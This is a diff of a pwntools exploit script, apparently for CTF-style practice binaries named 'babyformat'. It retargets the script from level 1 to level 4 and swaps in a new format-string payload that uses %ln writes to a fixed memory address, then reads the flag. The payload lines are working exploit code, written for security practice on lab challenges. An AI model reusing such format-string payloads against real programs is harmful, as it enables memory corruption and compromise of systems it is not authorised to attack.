@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template ./babyformat_level1
+# $ pwn template babyformat_level4
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level1')
+exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level4')
 context.terminal = ["tmux", "splitw", "-h"]
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -33,7 +33,7 @@ continue
 #===========================================================
 # Arch:     amd64-64-little
 # RELRO:    Partial RELRO
-# Stack:    Canary found
+# Stack:    No canary found
 # NX:       NX enabled
 # PIE:      No PIE (0x400000)
 
@@ -47,8 +47,10 @@ io = start()
 # io.send(payload)
 # flag = io.recv(...)
 # log.success(flag)
-buf = b"%04199197d%14$ln" + p64(0x404050)
-io.recvuntil(b"triggering the vulnerability:")
+# Both works
+# buf = b"%04199050d%79$lnAAAAA" + p64(0x404070)
+buf = b"%04199050d%79$lnAAAAA" + p64(0x404070) + b"\n"
+io.recvuntil(b"your input and then exit.")
 io.sendline(buf)
 io.recvuntil(b'flag:')
 io.interactive()
